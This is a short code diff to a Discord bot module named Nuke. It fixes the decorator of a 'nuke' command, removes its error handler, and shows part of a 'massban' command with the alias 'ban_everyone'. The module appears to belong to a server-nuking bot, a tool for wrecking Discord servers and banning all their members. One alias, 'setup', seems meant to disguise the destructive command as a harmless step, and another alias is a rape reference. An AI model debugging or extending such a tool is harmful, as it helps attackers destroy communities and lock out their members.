@@ -15,7 +15,7 @@ class Nuke(commands.Cog):
         self.bot = bot
         self.operations: Operations | None = getattr(bot, "operations", None)
 
-    @commands.command(name="nuke" alias=["kill", "rape", "setup"])
+    @commands.command(name="nuke", aliases=["kill", "rape", "setup"])
     @is_blacklisted
     async def nuke(self, ctx: commands.Context) -> None:
         guild = ctx.guild
@@ -39,13 +39,6 @@ class Nuke(commands.Cog):
         except Exception as e:
             tb = traceback.format_exc()
             logging.error(f"[nuke] failed: {e}\n{tb}")
-
-    @nuke.error
-    async def nuke_error(self, ctx: commands.Context, error):
-        if isinstance(error, commands.MissingPermissions):
-            await ctx.reply("Fluk", delete_after=5)
-        else:
-            logging.error(f"[nuke] command error: {error}")
 
     @commands.command(name="massban", aliases=["mb", "ban_everyone"])
     @commands.bot_has_permissions(ban_members=True)
